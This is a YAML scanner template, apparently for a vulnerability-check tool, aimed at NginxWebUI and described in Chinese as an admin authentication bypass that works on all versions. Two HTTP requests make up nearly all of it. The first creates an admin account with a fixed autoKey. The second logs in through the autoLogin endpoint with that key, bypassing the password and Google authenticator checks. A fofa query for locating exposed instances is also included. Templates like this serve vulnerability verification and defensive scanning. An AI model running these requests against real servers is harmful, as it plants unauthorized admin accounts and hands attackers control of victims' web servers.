id: nginxwebui-admin-bypass

info:
  name: NginxWebUI admin认证绕过（全版本通杀）
  author: zan8in
  severity: critical
  verified: true
  description: |-
    Admin类型注入autoKey绕过认证、绕过密码和Google认证获取管理员权限
    fofa: app="nginxWebUI"
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzU0MzkzOTYzOQ==&mid=2247488355&idx=1&sn=f18e4e4e83a9c7a16f2a8f4042f03c5a
  tags: nginxwebui,bypass
  created: 2023/11/28

rules:
  r0:
    request:
      method: POST
      path: /adminPage/admin/addOver
      body: |
        id=&name=test&api=false&type=0&autoKey=111111&parentId=
    expression: response.status == 200 && response.body.bcontains(b'"success":true') && response.body.bcontains(b'"status":200')
  r1:
    request:
      method: POST
      path: /adminPage/login/autoLogin?autoKey=111111
    expression: response.status == 200 && response.body.bcontains(b'"success":true') && response.body.bcontains(b'"status":200') && response.body.bcontains(b'"obj"') && response.body.bcontains(b'"autoKey":"111111"')
expression: r0() && r1()
